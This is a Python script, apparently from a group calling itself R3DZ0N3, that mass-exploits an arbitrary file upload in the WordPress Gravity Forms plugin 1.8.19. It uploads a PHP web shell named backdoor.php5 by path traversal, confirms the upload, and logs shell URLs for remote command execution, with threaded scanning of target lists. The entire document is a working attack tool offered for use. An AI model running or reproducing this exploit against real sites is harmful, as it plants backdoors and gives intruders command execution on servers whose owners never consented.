#!/usr/bin/python
import os
import sys
import time
import json
import optparse
import urllib.request as urllib2
from pprint import pprint
from colorama import init,Fore,Style
from threading import Thread, Semaphore
init(autoreset=True, convert=bool(os.name=="nt"))
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
sd  =   Style.DIM
sn  =   Style.NORMAL
sb  =   Style.BRIGHT

def _banner():
    ban = f"""{fr}
                                                                 
                                                                 
                                                                 
    ██████╗ ██████╗ ██████╗ ███████╗ ██████╗ ███╗   ██╗██████╗ 
    ██╔══██╗╚════██╗██╔══██╗╚══███╔╝██╔═████╗████╗  ██║╚════██╗
    ██████╔╝ █████╔╝██║  ██║  ███╔╝ ██║██╔██║██╔██╗ ██║ █████╔╝
    ██╔══██╗ ╚═══██╗██║  ██║ ███╔╝  ████╔╝██║██║╚██╗██║ ╚═══██╗
    ██║  ██║██████╔╝██████╔╝███████╗╚██████╔╝██║ ╚████║██████╔╝
    ╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝                       
                                                      
{fw}WordPress Gravity Forms Plugin 1.8.19 - Arbitrary File Upload RCE (fixed and improved)                                           
                     {fg}Telegram : {fc}@Team_R3DZ0N3                                            

"""
    return ban

def _prepare(target):
    if "http://" in target or "https://" in target:
        _url    =   '{}/?gf_page=upload'.format(target)
    else:
        _url    =   'http://{}/?gf_page=upload'.format(target)
    _data   = '<?php system($_GET["cmd"]); ?>&field_id=3&form_id=1&gform_unique_id=../../../../&name=backdoor.php5'
    return _url, _data

def _prepare_verify_url(target):
    if "http://" in target or "https://" in target:
        _url    =   '{}/wp-content/_input_3_backdoor.php5'.format(target)
    else:
        _url    =   'http://{}/wp-content/_input_3_backdoor.php5'.format(target)
    return _url

def _verify(url):
    try:
        resp    =   urllib2.urlopen(url).read()
    except urllib2.HTTPError as e:
        _json_resp  = {"status" : "failed"}
    except urllib2.URLError as e:
        _json_resp  = {"status" : "failed"}
    except KeyboardInterrupt as e:
        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
        exit(0)
    else:
        if 'backdoor.php5' in resp:
            _json_resp  = {"status" : "ok"}
        else:
            _json_resp  = {"status" : "failed"}
    return _json_resp

def _exploit(url, payload=None):
    try:
        if payload:
            payload = payload.encode("utf-8")
        resp    =   urllib2.urlopen(url, data=payload)
    except urllib2.HTTPError as e:
        _json_resp  = {"status" : "failed"}
    except urllib2.URLError as e:
        _json_resp  = {"status" : "failed"}
    except KeyboardInterrupt as e:
        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
        exit(0)
    else:
        try:
            _json_resp  = json.load(resp)
        except:
            _json_resp  = {"status" : "failed"}
    return _json_resp

def _is_vulnerable(url):
    try:
        resp    =   urllib2.urlopen(url)
    except urllib2.HTTPError as e:
        _json_resp  = {"status" : "failed"}
    except urllib2.URLError as e:
        _json_resp  = {"status" : "failed"}
    except KeyboardInterrupt as e:
        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
        exit(0)
    else:
        try:
            _json_resp  = json.load(resp)
        except:
            _json_resp  = {"status" : "failed"}
    return _json_resp

class ExploitThread(Thread):
    def __init__(self, target, vuln_only=False):
        super().__init__()
        self.target = target
        self.vuln_only = vuln_only

    def run(self):
        url, data = _prepare(self.target)
        sys.stdout.write('{}{}[*] {}'.format(fg, sd, self.target))
        response = _is_vulnerable(url)
        status = response.get('status')
        if status == 'failed':
            sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}not vulnerable{}{})'.format(fg, sd, self.target, fw, sb, fg, sd))
            print("")
        elif status == 'error':
            sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}vulnerable{}{})'.format(fg, sd, self.target, fr, sb, fg, sd))
            print("")
            if not self.vuln_only:
                with open("vulnerable.txt", "a") as f:
                    f.write('{}\n'.format(self.target))
                f.close()
                sys.stdout.write('{}{}[*] trying to exploit '.format(fg, sd))
                response = _exploit(url, payload=data)
                status = response.get('status')
                if status == 'failed':
                    sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to exploit", fr, sb, fg, sd))
                    print("")
                elif status == 'error':
                    sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to exploit", fr, sb, fg, sd))
                    print("")
                elif status == 'ok':
                    sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}exploited{}{})'.format(fg, sd, "trying to exploit", fc, sb, fg, sd))
                    print("")
                    sys.stdout.write('{}{}[*] trying to verify '.format(fg, sd))
                    url = _prepare_verify_url(self.target)
                    response = _verify(url)
                    status = response.get("status")
                    if status == "failed":
                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to verify", fr, sb, fg, sd))
                    elif status == "ok":
                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}successful{}{})'.format(fg, sd, "trying to verify", fg, sb, fg, sd))
                        print("")
                        with open("exploited.txt", "a") as f:
                            f.write('{}?cmd=uname -a\n'.format(url))
                        f.close()

def main():
    banner      =   _banner()
    usage       = f'''{fr}%prog {fg}[-h] [-u "target"] [-v] [-f "file.txt"] [-t "num_threads"]'''
    parser      =   optparse.OptionParser(usage=usage,conflict_handler="resolve")

    sys.stdout.write('{}\n\n'.format(banner))
    print (f"{fr}")
    parser.add_option("-v", "--vuln",dest="vuln", action='store_true',
                      help=f"{fg}Only identify if target is vulnerable.")
    parser.add_option("-u", dest="target", type="string" , \
                      help=f"{fg}Target url to check (e.g:- http://abc.com)")
    parser.add_option("-f",dest="filename", type="string" , \
                      help=f"{fg}File containg list of targets (e.g:- <filename>.txt)")
    parser.add_option("-t", "--threads", dest="num_threads", type="int", default=1,
                      help=f"{fg}Number of threads to use for scanning.")
    (options, args) = parser.parse_args()

    if not options.target and not options.filename:
        parser.print_help()
    elif options.target and not options.filename:
        target = options.target
        url, data = _prepare(target)
        ExploitThread(target, options.vuln).start()
    elif options.filename and not options.target:
        filename = options.filename
        f_in = open(filename)
        targets = set(list(line for line in (l.strip() for l in f_in) if line))
        semaphore = Semaphore(options.num_threads)
        for target in targets:
            semaphore.acquire()
            ExploitThread(target, options.vuln).start()
            semaphore.release()
        f_in.close()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
        exit(0)
